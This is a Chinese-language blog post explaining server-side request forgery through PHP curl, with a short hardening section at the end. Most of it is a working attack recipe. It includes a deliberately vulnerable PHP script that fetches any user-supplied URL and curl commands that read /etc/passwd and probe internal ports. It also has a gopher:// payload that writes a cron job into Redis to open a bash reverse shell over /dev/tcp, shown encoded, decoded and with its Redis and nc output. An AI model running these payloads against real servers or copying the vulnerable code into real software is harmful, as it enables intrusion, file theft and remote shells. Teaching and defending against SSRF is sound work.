---
layout: post

title: "php curl ssrf攻击"
date: 2017-04-12 22:44:01 +0800
modified: 2017-07-24 16:47:48 +0800
image: true

categories: php
tags: [php, ssrf, curl, 网络安全]
---

## 什么是 SSRF  [^1]
>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。
>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。

### 三个使用`curl`进行`ssrf`的示例 [^2]

```bash
# 利用file协议查看文件
curl -v 'file:///etc/passwd'

# 利用dict探测端口
curl -v 'dict://127.0.0.1:22'
curl -v 'dict://127.0.0.1:6379/info'

# 利用gopher协议反弹shell
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```

漏洞代码 **example.php**（ 未做任何SSRF防御 ）
```php
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);
```

### **file**

执行 `http://localhost/example.php?url=file:///etc/passwd`, 结果如下,打印文件内容

![passwd info]({{ site.url }}/assets/images/201704/12-01.png)

### **dict**

执行 `http://localhost/example.php?url=dict://127.0.0.1:22`, 结果如下, 现实端口信息

![dict info]({{ site.url }}/assets/images/201704/12-02.png)

### **gopher**

>Gopher是一个互联网上使用的分布型的文件搜集获取网络协议。 [^3]

`redis反弹shell`代码如下:
>gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a

转译后的 **攻击脚本**
```
gopher://127.0.0.1:6379/_*3
$3
set
$1
1
$56



*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1





*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
*1
$4
quit
```
执行后, 在redis中查看
```bash
127.0.0.1:6379> key *
(error) ERR unknown command 'key'
127.0.0.1:6379> keys *
1) "msg"
2) "numbers"
3) "1"
127.0.0.1:6379> get 1
"\r\n\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n"
127.0.0.1:6379>
```
使用 `nc` 监听查看 2333端口反馈信息 [^4]
```bash
$ nc -lvv 2333                                                            1 ↵
Listening on [0.0.0.0] (family 0, port 2333)
```

使用说明:
>gopher协议使用方法：gopher://ip:port/_payload

**gopher转换规则** 如下：

- 如果`第一个字符`是 **>** 或者 **<** 那么丢弃该行字符串，表示请求和返回的时间。
- 如果`前3个字符`是+OK 那么`丢弃`该行字符串，表示返回的字符串。
- 将`\r`字符串替换成`%0d%0a`
- 空白行替换为%0a


## curl安全

1. 限制只支持HTTPS、HTTP协议

    在 `curl_setopt`中添加 `curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);`

    则 **file**,**dict**,**gopher** 等其他协议将被过滤, 可以阻止一些ssrf.

1. 禁止30x跳转 (默认关闭)

    在 `curl_setopt`中添加 `curl_setopt($ch, CURLOPT_FOLLOWLOCATION, False);`


>原文: [JoyChou - SSRF in PHP](http://joychou.org/index.php/web/phpssrf.html)

---
### 更多阅读
- [SSRF](https://hxer.github.io/WebSecurity/ssrf.html)
- [ssrf proxy](https://bcoles.github.io/ssrf_proxy/)
- [Server Side Request Forgery (SSRF)](http://niiconsulting.com/checkmate/2015/04/server-side-request-forgery-ssrf/)
- [What is the Server Side Request Forgery Vulnerability & How to Prevent It?](https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/)
- [利用 gopher 协议拓展攻击面](https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2)
- [SSRF漏洞的利用与学习](http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html)

---
### 索引

[^1]: [SSRF](https://hxer.github.io/WebSecurity/ssrf.html)
[^2]: [JoyChou - SSRF in PHP](http://joychou.org/index.php/web/phpssrf.html)
[^3]: [Gopher (protocol)](https://en.wikipedia.org/wiki/Gopher_(protocol))
[^4]: [利用 gopher 协议拓展攻击面](https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2)
